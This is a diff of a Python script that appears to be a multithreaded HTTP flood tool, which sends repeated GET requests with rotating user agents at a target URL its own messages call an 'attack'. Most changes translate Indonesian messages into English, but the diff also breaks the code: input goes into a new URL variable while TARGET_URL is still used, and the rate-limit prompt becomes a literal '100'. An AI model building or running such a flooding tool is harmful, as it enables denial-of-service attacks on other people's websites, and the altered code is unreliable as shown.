@@ -28,11 +28,11 @@ def send_request(url, user_agent):
     try:
         response = requests.get(url, headers=headers)
         if response.status_code >= 200 and response.status_code < 300:
-            print(f"Request berhasil: {url}")
+            print(f"Send Request: {url}")
         else:
-            print(f"Request gagal: {url} ({response.status_code})")
+            print(f"Failed Request: {url} ({response.status_code})")
     except requests.exceptions.RequestException as e:
-        print(f"Request gagal: {url} ({e})")
+        print(f"Failed Request: {url} ({e})")
 
 # Fungsi untuk menjalankan worker
 def worker(url, user_agents, num_requests):
@@ -54,15 +54,15 @@ def worker_pool(url, num_threads, num_requests, user_agents):
 def main():
     global TARGET_URL, NUM_THREADS, RATE_LIMIT
     print("~~~~~MEMEY~~~~~")
-    TARGET_URL = input("target URL: ")
-    if not TARGET_URL:
-        print("Masukkan URL dengan benar")
+    URL = input("web URL: ")
+    if not URL:
+        print("Input web URL ")
         sys.exit(1)
     NUM_THREADS = int(input("threads: "))
     if NUM_THREADS <= 0:
         print("Threads harus lebih besar dari 0")
         sys.exit(1)
-    RATE_LIMIT = int(input("rate limit (misal: 100ms): "))
+    RATE_LIMIT = int(input("100"))
     if RATE_LIMIT <= 0:
         print("Rate limit harus lebih besar dari 0")
         sys.exit(1)
@@ -70,11 +70,11 @@ def main():
     if not user_agents:
         print("User agent list kosong")
         sys.exit(1)
-    print(f"Starting attack pada {TARGET_URL} dengan {NUM_THREADS} threads")
+    print(f"Starting attack at {TARGET_URL} with {NUM_THREADS} threads")
     start_time = datetime.now()
     worker_pool(TARGET_URL, NUM_THREADS, 100, user_agents)
     end_time = datetime.now()
-    print(f"Attack selesai dalam {end_time - start_time}")
+    print(f"End {end_time - start_time}")
 
 if __name__ == "__main__":
     main()
